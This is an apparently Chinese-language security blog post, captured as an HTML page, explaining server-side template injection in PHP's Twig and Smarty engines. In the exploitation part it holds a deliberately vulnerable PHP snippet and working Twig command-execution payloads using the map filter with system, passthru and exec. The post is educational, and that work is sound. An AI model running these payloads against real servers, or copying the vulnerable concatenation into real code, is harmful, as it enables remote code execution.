@@ -1,0 +1,493 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>SSTI（服务端模版注入） | Tawnx's Blog</title><meta name="author" content="Tawnx"><meta name="copyright" content="Tawnx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SSTI（服务端模版注入）简介模板引擎模板引擎使开发者能够在应用程序中使用静态模板文件。 在运行时，模板引擎将模板文件中的变量替换为实际值，并将模板转换为发送给客户端的 HTML 文件。 这种方法使设计 HTML 页面变得更加容易。 数据绑定示例在模板中，开发人员将为动态值定义静态内容和占位符。 在运行时，模板将由其引擎处理以映射模板中的动态值引用。 1Hello &amp;#123;&amp;#123;Name">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI（服务端模版注入）">
+<meta property="og:url" content="http://blog.tawnx.com/2022/07/25/SSTI/index.html">
+<meta property="og:site_name" content="Tawnx&#39;s Blog">
+<meta property="og:description" content="SSTI（服务端模版注入）简介模板引擎模板引擎使开发者能够在应用程序中使用静态模板文件。 在运行时，模板引擎将模板文件中的变量替换为实际值，并将模板转换为发送给客户端的 HTML 文件。 这种方法使设计 HTML 页面变得更加容易。 数据绑定示例在模板中，开发人员将为动态值定义静态内容和占位符。 在运行时，模板将由其引擎处理以映射模板中的动态值引用。 1Hello &amp;#123;&amp;#123;Name">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/%E6%88%AA%E5%B1%8F2022-07-24-%E4%B8%8B%E5%8D%887.44.53.png">
+<meta property="article:published_time" content="2022-07-25T13:03:38.000Z">
+<meta property="article:modified_time" content="2023-02-19T06:27:42.000Z">
+<meta property="article:author" content="Tawnx">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Security">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/%E6%88%AA%E5%B1%8F2022-07-24-%E4%B8%8B%E5%8D%887.44.53.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://blog.tawnx.com/2022/07/25/SSTI/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SSTI（服务端模版注入）',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-02-19 14:27:42'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = url => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      link.onload = () => resolve()
+      link.onerror = () => reject()
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-24-下午7.44.53.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Tawnx's Blog"><span class="site-name">Tawnx's Blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SSTI（服务端模版注入）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-07-25T13:03:38.000Z" title="Created 2022-07-25 21:03:38">2022-07-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-02-19T06:27:42.000Z" title="Updated 2023-02-19 14:27:42">2023-02-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">web安全基础漏洞</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SSTI（服务端模版注入）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="SSTI（服务端模版注入）"><a href="#SSTI（服务端模版注入）" class="headerlink" title="SSTI（服务端模版注入）"></a>SSTI（服务端模版注入）</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h3><p>模板引擎使开发者能够在应用程序中使用静态模板文件。 在运行时，模板引擎将模板文件中的变量替换为实际值，并将模板转换为发送给客户端的 HTML 文件。 这种方法使设计 HTML 页面变得更加容易。</p>
+<h3 id="数据绑定示例"><a href="#数据绑定示例" class="headerlink" title="数据绑定示例"></a>数据绑定示例</h3><p>在模板中，开发人员将为动态值定义静态内容和占位符。 在运行时，模板将由其引擎处理以映射模板中的动态值引用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello &#123;&#123;Name&#125;&#125; !</span><br></pre></td></tr></table></figure>
+
+<p>在传入Name的值，经过引擎处理后的输出就是</p>
+<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/%E6%88%AA%E5%B1%8F2022-07-23-%E4%B8%8B%E5%8D%882.41.24.png" alt="img"></p>
+<h3 id="各种语言常见模版引擎"><a href="#各种语言常见模版引擎" class="headerlink" title="各种语言常见模版引擎"></a>各种语言常见模版引擎</h3><ul>
+<li>C# (StringTemplate, ASPX which is used dynamically on Sharepoint)</li>
+<li>Java (Velocity, Freemarker, Pebble, Thymeleaf and Jinjava)</li>
+<li>PHP (Twig, Smarty, Dwoo, Volt, Blade, Plates, Mustache)</li>
+<li>Python (Jinja2, Tornado)</li>
+<li>Go (text&#x2F;template)</li>
+</ul>
+<h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>SSTI，全称 Server Side Template Injection 服务端模板注入，这是由于开发人员的开发不当，让用户的输入成为了模版的一部分，从而使恶意代码注入到 Web 服务器执行命令，可借助或由 SSTI 导致 RCE 读取服务器上的敏感信息，因此这种漏洞通常很严重。</p>
+<p>通过一个Twig的例子详细演示一下SSTI是怎么回事：</p>
+<p>Twig 可能是 PHP 中最流行的模板库。 它是由非常流行的 PHP 框架 Synfony 的创建者开发的。可以使用composer在对应的目录安装：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require &quot;twig/twig:^3.0&quot;</span><br></pre></td></tr></table></figure>
+
+<p>安装完成后，新建一个index.php，写上下面的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &#x27;/path/to/vendor/autoload.php&#x27;; // 添加引用</span><br><span class="line"></span><br><span class="line">$loader = new \Twig\Loader\ArrayLoader([</span><br><span class="line">    &#x27;index&#x27; =&gt; &#x27;Hello &#123;&#123; name &#125;&#125;!&#x27;,</span><br><span class="line">]);</span><br><span class="line">$twig = new \Twig\Environment($loader);</span><br><span class="line"></span><br><span class="line">echo $twig-&gt;render(&#x27;index&#x27;, [&#x27;name&#x27; =&gt; $_GET[&#x27;name&#x27;]]);</span><br></pre></td></tr></table></figure>
+
+<p>这是一个简单的程序，使用装载器 (<code>\Twig\Loader\ArrayLoader</code> )来定位模板，然后使用环境变量 (<code>\Twig\Environment</code> )存储其配置。 <code>render()</code> 方法的第一个参数为传递的模板，第二个参数为传递的变量，返回渲染后的内容。Twig将花括号 <code>&#123;&#125;</code> 作为变量或者语句的标识（参考：<a target="_blank" rel="noopener" href="https://twig.symfony.com/doc/3.x/templates.html#variables%EF%BC%89%E6%B8%B2%E6%9F%93%E7%9A%84%E6%97%B6%E5%80%99%E4%BC%9A%E5%B0%86%E8%A2%AB">https://twig.symfony.com/doc/3.x/templates.html#variables）渲染的时候会将被</a> <code>&#123;&#125;</code> 包含的片段进行处理，例如变量替换，语句解析等等。</p>
+<p>例如在这里，<code>Hello &#123;&#123; name &#125;&#125;!</code> 这个字符串作为模版输入，<code>[&#39;name&#39; =&gt; $_GET[&#39;name&#39;]]</code>数组作为渲染的参数输入，渲染的时候将 <code>&#123;&#123; name &#125;&#125;</code> 替换为get请求参数中name的值，然后返回，内部会经过html的转义，所以这里是没有漏洞的。但是如果直接拼接字符串，就有会出现SSTI漏洞。例如下面的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &#x27;./vendor/autoload.php&#x27;; // 添加引用</span><br><span class="line"></span><br><span class="line">$loader = new \Twig\Loader\ArrayLoader([</span><br><span class="line">    &#x27;index&#x27; =&gt; &#x27;Hello &#x27;.$_GET[&#x27;name&#x27;].&#x27; !&#x27;,</span><br><span class="line">]);</span><br><span class="line">$twig = new \Twig\Environment($loader);</span><br><span class="line"></span><br><span class="line">echo $twig-&gt;render(&#x27;index&#x27;); // 将loader中key为index的value拿去渲染，渲染完返回并输出页面</span><br></pre></td></tr></table></figure>
+
+<p>访问这个页面，请求参数name的值直接拼接字符串，把这个拼接成的字符串传入render中进行渲染，然后返回输出。因为是直接拼接字符串，所以没有经过Twig的html字符转义，可以进行XSS：</p>
+<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/%E6%88%AA%E5%B1%8F2022-07-23-%E4%B8%8B%E5%8D%883.14.24.png" alt="img"></p>
+<p>同时，也可以输入构造Twig的语法进行其他操作，例如输入 <code>&#123;&#123;7*7&#125;&#125;</code> ，渲染时会进行一个计算：</p>
+<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/%E6%88%AA%E5%B1%8F2022-07-23-%E4%B8%8B%E5%8D%883.23.29.png" alt="img"></p>
+<p>也可以构造语句来执行命令：</p>
+<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/%E6%88%AA%E5%B1%8F2022-07-23-%E4%B8%8B%E5%8D%883.46.01.png" alt="img"></p>
+<p>不同的模版引擎构造的payload略有不同，部分payload只有特定版本的模版引擎才能使用。</p>
+<h2 id="PHP中的SSTI"><a href="#PHP中的SSTI" class="headerlink" title="PHP中的SSTI"></a>PHP中的SSTI</h2><h3 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h3><h4 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h4><h5 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h5><p>应用程序将变量传入模板中进行处理，变量可以包含你能访问的属性或元素。你可以使用 <code>.</code> 来访问变量中的属性（方法或 PHP 对象的属性，或 PHP 数组单元），也可以使用所谓的 “subscript” 语法 <code>[]</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; foo.bar &#125;&#125;</span><br><span class="line">&#123;&#123; foo[&#x27;bar&#x27;] &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="设置变量"><a href="#设置变量" class="headerlink" title="设置变量"></a>设置变量</h5><p>可以为模板代码块内的变量赋值，赋值使用 <a target="_blank" rel="noopener" href="https://www.osgeo.cn/twig/tags/set.html">set</a> 标签：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set foo = &#x27;foo&#x27; %&#125;</span><br><span class="line">&#123;% set foo = [1, 2] %&#125;</span><br><span class="line">&#123;% set foo = &#123;&#x27;foo&#x27;: &#x27;bar&#x27;&#125; %&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><p>可以通过过滤器 filters 来修改模板中的变量。在过滤器中，变量与过滤器或多个过滤器之间使用 <code>|</code> 分隔，还可以在括号中加入可选参数。可以连接多个过滤器，一个过滤器的输出结果将用于下一个过滤器中。</p>
+<p>下面这个过滤器的例子会剥去字符串变量 <code>name</code> 中的 HTML 标签，然后将其转化为大写字母开头的格式:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; name|striptags|title &#125;&#125;</span><br><span class="line"></span><br><span class="line">// &#123;&#123; &#x27;&lt;a&gt;whoami&lt;a&gt;&#x27;|striptags|title &#125;&#125;</span><br><span class="line">// Output: Whoami!</span><br></pre></td></tr></table></figure>
+
+<p>下面这个过滤器将接收一个序列 <code>list</code>，然后使用 <code>join</code> 中指定的分隔符将序列中的项合并成一个字符串：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; list|join &#125;&#125;</span><br><span class="line">&#123;&#123; list|join(&#x27;, &#x27;) &#125;&#125;</span><br><span class="line"></span><br><span class="line">// &#123;&#123; [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]|join &#125;&#125;</span><br><span class="line">// Output: abc</span><br><span class="line"></span><br><span class="line">// &#123;&#123; [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]|join(&#x27;|&#x27;) &#125;&#125;</span><br><span class="line">// Output: a|b|c</span><br></pre></td></tr></table></figure>
+
+<p>更多内置过滤器请参考：<a target="_blank" rel="noopener" href="https://twig.symfony.com/doc/3.x/filters/index.html">https://twig.symfony.com/doc/3.x/filters/index.html</a></p>
+<h5 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h5><p>在 Twig 模板中可以直接调用函数，用于生产内容。如下调用了 <code>range()</code> 函数用来返回一个包含整数等差数列的列表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for i in range(0, 3) %&#125;</span><br><span class="line">    &#123;&#123; i &#125;&#125;,</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">// Output: 0, 1, 2, 3,</span><br></pre></td></tr></table></figure>
+
+<p>更多内置函数请参考：<a target="_blank" rel="noopener" href="https://twig.symfony.com/doc/3.x/functions/index.html">https://twig.symfony.com/doc/3.x/functions/index.html</a></p>
+<h5 id="控制结构"><a href="#控制结构" class="headerlink" title="控制结构"></a>控制结构</h5><p>控制结构是指控制程序流程的所有控制语句 <code>if</code>、<code>elseif</code>、<code>else</code>、<code>for</code> 等，以及程序块等等。控制结构出现在 <code>&#123;% ... %&#125;</code> 块中。</p>
+<p>例如使用 <code>for</code> 标签进行循环：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;Members&lt;/h1&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &#123;% for user in users %&#125;</span><br><span class="line">        &lt;li&gt;&#123;&#123; user.username|e &#125;&#125;&lt;/li&gt;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>if</code> 标签可以用来测试表达式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if users|length &gt; 0 %&#125;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &#123;% for user in users %&#125;</span><br><span class="line">            &lt;li&gt;&#123;&#123; user.username|e &#125;&#125;&lt;/li&gt;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>更多 tags 请参考：<a target="_blank" rel="noopener" href="https://twig.symfony.com/doc/3.x/tags/index.html">https://twig.symfony.com/doc/3.x/tags/index.html</a></p>
+<h5 id="引入其他模板"><a href="#引入其他模板" class="headerlink" title="引入其他模板"></a>引入其他模板</h5><p>Twig 提供的 <code>include</code> 函数可以使你更方便地在模板中引入模板，并将该模板已渲染后的内容返回到当前模板：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; include(&#x27;sidebar.html&#x27;) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><h5 id="使用-map-过滤器"><a href="#使用-map-过滤器" class="headerlink" title="使用 map 过滤器"></a>使用 map 过滤器</h5><p>在 Twig 3.x 中，<code>map</code> 这个过滤器可以允许用户传递一个<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/functions.arrow.php">箭头函数</a>，并将这个箭头函数应用于序列或映射的元素：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set people = [</span><br><span class="line">    &#123;first: &quot;Bob&quot;, last: &quot;Smith&quot;&#125;,</span><br><span class="line">    &#123;first: &quot;Alice&quot;, last: &quot;Dupond&quot;&#125;,</span><br><span class="line">] %&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123; people|map(p =&gt; &quot;#&#123;p.first&#125; #&#123;p.last&#125;&quot;)|join(&#x27;, &#x27;) &#125;&#125;</span><br><span class="line">// Output: outputs Bob Smith, Alice Dupond</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% set people = &#123;</span><br><span class="line">    &quot;Bob&quot;: &quot;Smith&quot;,</span><br><span class="line">    &quot;Alice&quot;: &quot;Dupond&quot;,</span><br><span class="line">&#125; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123; people|map((last, first) =&gt; &quot;#&#123;first&#125; #&#123;last&#125;&quot;)|join(&#x27;, &#x27;) &#125;&#125;</span><br><span class="line">// Output: outputs Bob Smith, Alice Dupond</span><br></pre></td></tr></table></figure>
+
+<p>当我们如下使用 <code>map</code> 时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[&quot;Mark&quot;]|map((arg)=&gt;&quot;Hello #&#123;arg&#125;!&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Twig 3.x 会将其编译成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">twig_array_map([0 =&gt; &quot;Mark&quot;], function ($__arg__) use ($context, $macros) &#123; $context[&quot;arg&quot;] = $__arg__; return (&quot;hello &quot; . ($context[&quot;arg&quot;] ?? null))&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>这个 <code>twig_array_map</code> 函数的源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function twig_array_map($array, $arrow)</span><br><span class="line">&#123;</span><br><span class="line">    $r = [];</span><br><span class="line">    foreach ($array as $k =&gt; $v) &#123;</span><br><span class="line">        $r[$k] = $arrow($v, $k);    // 直接将 $arrow 当做函数执行</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从上面的代码我们可以看到，传入的 <code>$arrow</code> 直接就被当成函数执行，即 <code>$arrow($v, $k)</code>，而 <code>$v</code> 和 <code>$k</code> 分别是 <code>$array</code> 中的 value 和 key。<code>$array</code> 和 <code>$arrow</code> 都是我们我们可控的，那我们可以不传箭头函数，直接传一个可传入两个参数的、能够命令执行的危险函数名即可实现命令执行。通过查阅常见的命令执行函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system ( string $command [, int &amp;$return_var ] ) : string</span><br><span class="line">passthru ( string $command [, int &amp;$return_var ] )</span><br><span class="line">exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] ) : string</span><br><span class="line">shell_exec ( string $cmd ) : string</span><br></pre></td></tr></table></figure>
+
+<p>前三个都可以使用。相应的 Payload 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;exec&quot;)&#125;&#125;    // 无回显</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>&#123;&#123;["id"]|map("system")&#125;&#125;</code> 会被成下面这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">twig_array_map([0 =&gt; &quot;id&quot;], &quot;sysetm&quot;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>Smarty是一个使用PHP写出来的模板引擎，是目前业界最著名的PHP模板引擎之一。</p>
+<h4 id="基础语法-1"><a href="#基础语法-1" class="headerlink" title="基础语法"></a>基础语法</h4><h5 id="变量-1"><a href="#变量-1" class="headerlink" title="变量"></a>变量</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;$foo&#125;        &lt;-- 显示简单的变量 (非数组/对象)</span><br><span class="line">&#123;$foo[4]&#125;     &lt;-- 在0开始索引的数组中显示第五个元素</span><br><span class="line">&#123;$foo.bar&#125;    &lt;-- 显示&quot;bar&quot;下标指向的数组值，等同于PHP的$foo[&#x27;bar&#x27;]</span><br></pre></td></tr></table></figure>
+
+<p>更多变量参考：<a target="_blank" rel="noopener" href="https://www.smarty.net/docs/zh_CN/language.syntax.variables.tpl">https://www.smarty.net/docs/zh_CN/language.syntax.variables.tpl</a></p>
+<h5 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h5><p><code>&#123;for&#125;</code> 语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;for $foo=1 to 3&#125;</span><br><span class="line">    &#123;$foo&#125;,</span><br><span class="line">&#123;/for&#125;</span><br><span class="line"></span><br><span class="line">// Output:1, 2, 3,</span><br></pre></td></tr></table></figure>
+
+<p><code>&#123;if&#125;</code> 、<code>&#123;ifelse&#125;</code> 和 <code>&#123;else&#125;</code> 语句，每个 <code>&#123;if&#125;</code> 都要和一个 <code>&#123;/if&#125;</code> 相匹配</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;if $logged_in&#125;</span><br><span class="line">    Welcome, &lt;span&gt;&#123;$name&#125;!&lt;/span&gt;</span><br><span class="line">&#123;else&#125;</span><br><span class="line">    Please log in!</span><br><span class="line">&#123;/if&#125;</span><br></pre></td></tr></table></figure>
+
+<p>更多内置函数参考：<a target="_blank" rel="noopener" href="https://www.smarty.net/docs/zh_CN/language.builtin.functions.tpl">https://www.smarty.net/docs/zh_CN/language.builtin.functions.tpl</a></p>
